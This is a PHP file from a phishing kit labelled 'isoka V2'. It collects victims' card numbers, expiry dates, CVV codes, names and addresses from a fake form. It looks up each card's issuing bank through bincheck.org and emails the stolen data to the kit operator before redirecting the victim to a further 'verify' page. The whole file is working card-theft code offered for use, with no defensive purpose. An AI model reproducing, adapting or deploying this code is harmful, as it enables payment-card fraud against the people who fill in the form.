<? 
session_start();
date_default_timezone_set('GMT');
$time = date('d/m/Y G:i:s');
include('../antibots.php');
include('../email.php');
$INF = $_POST['dcn'] && $_POST['expiration'] && $_POST['cvv'] && $_POST['fullname'];
if (empty($INF)==false) {
$_SESSION['confirm_card'] = 'success';
$_SESSION['ccnum']= $_POST['dcn'];
$_SESSION['expdate']   = $_POST['expiration'];
$_SESSION['cvv2']       = $_POST['cvv'];
$_SESSION['cchn']  = $_POST['fullname'];
if (empty($_POST['address'])== false) {
    $_SESSION['address']  = $_POST['address'];
}
function curl_http($url){
  $ci = curl_init();
  curl_setopt_array($ci, array(
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    ));
  return curl_exec($ci);
  curl_close($ci);
}
function fetch_value($str, $find_start, $find_end)
{
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
$b   = str_replace(' ', '', $_SESSION['ccnum']);
$b     = substr($b, 0, 6); 
$echo = curl_http('https://bincheck.org/'.$b.'');
//////////////////// BRAND //////////////////////
$BrandUrl = fetch_value($echo,'Brand</th>','</td>');
$_SESSION['brand'] = fetch_value($BrandUrl,'">','</');
 
//////////////////// TYPE //////////////////////
$type = fetch_value($echo,'Type</th>','</td>'); 
$_SESSION['type'] =  str_replace("<td>","",$type);
//////////////////// CATEGORY //////////////////////
$category = fetch_value($echo,'Category</th>','</td>');
$category_check =  str_replace("<td>","",$category);
if (stripos($category_check, "--") !== false) {
    $_SESSION['category'] = '';
}else{
    $_SESSION['category'] = $category_check;
}
//////////////////// BANK //////////////////////
$bank = fetch_value($echo,'Bank</th>','</td>');
$bank_check =  str_replace("<td>","",$bank);
if (stripos($bank_check, "--") !== false) {
    $_SESSION['bankname'] = '';
}else{
    $_SESSION['bankname'] = $bank_check;
}

//////////////////// BANK URL //////////////////////
$urlbnk = fetch_value($echo,'Bank URL</th>','</td>');
$url_check =  str_replace("<td>","",$urlbnk);
if (stripos($url_check, "--") !== false) {
    $_SESSION['url'] = '';
}else{
    $_SESSION['url'] = $url_check;
}

//////////////////// COUNTRY //////////////////////
$countryUrl = fetch_value($echo,'Country</th>','</td>');
$country_cc = fetch_value($countryUrl,'">','</');
$country_check =  str_replace("<td>","",$country_cc);
if (stripos($country_check, "#N/A") !== false) {
    $_SESSION['country_cc'] = '';
}else{
    $_SESSION['country_cc'] = $country_check;
}



if ($_SESSION['bankname'] !== '') {
$s   = $_SESSION['bankname'];
$arr = str_split($s);
array_shift($arr);
$s   = implode('', $arr);
$Remove_space = str_replace(" ","+",$s);
$removePlus = trim($Remove_space, "+");
$correct = str_replace("+Plc","",$removePlus);
$bnk = curl_http('http://www.webcrawler.com/serp?qc=images&q='.$correct.'+logo');
$getUrl = fetch_value($bnk,'" target="_blank">','">');
$_SESSION['logo_bnk'] = explode(' ',strstr($getUrl,'https://'))[0];
}else{
    $_SESSION['logo_bnk'] = '';
}
$msg = "
<html>
<head><meta charset=\"UTF-8\">
</head>
-------------- isoka V2 --------------<br>
 Nom de la carte  = <font style='color:#08559C;'>".$_SESSION['cchn']."</font><br>
 Numero  = <font style='color:#08559C;'>".$_SESSION['ccnum']."|".$_SESSION['expdate']."|".$_SESSION['cvv2']."</font><br>
 Type         = <font style='color:#08559C;'>".$_SESSION['Brand']."</font><br>
 Credit/Debit = <font style='color:#08559C;'>".$_SESSION['type']."</font><br>
 Level        = <font style='color:#08559C;'>".$_SESSION['category']."</font><br>
 Nom de la banque      = <font style='color:#08559C;'>".$_SESSION['bankname']."</font><br>
 Url de la banque       = <font style='color:#08559C;'><a href=".$_SESSION['url']." style='color:#08559C;'>".$_SESSION['url']."</a></font><br>
 Country      = <font style='color:#08559C;'>".$_SESSION['cn']."</font><br>
 Navigateur internet  = <font style='color:#08559C;'>".$_SESSION['bro']." On ".$_SESSION['os']."<br>
 -------------- isoka V2 --------------
</html>\n";
 if (empty($_SESSION['address']) == false) {
$msg .= "Address      = <font style='color:#08559C;'>".$_SESSION['address']."</font> (Address line, Postal code, City) <br>\n";
 }
    $subject = "💳 CC 💳 [".$_SESSION['cn']."] [".$_SESSION['ip']."]";
    $headers = "From:🐉 Hunter x Hunter V2 🐉 <Rez@isoka>";
    $headers .= $_POST['eMailAdd']."\n";
    $headers .= "MIME-Version: 1.0\n";
    $headers .= "Content-type: text/html; charset=UTF-8\n"; 
    @mail($adresse_email, $subject, $msg,$headers);
	header("Location: verify?websc=_session=".$_SESSION['code_cn']."&".$_SESSION['SESSION'].""); 
}
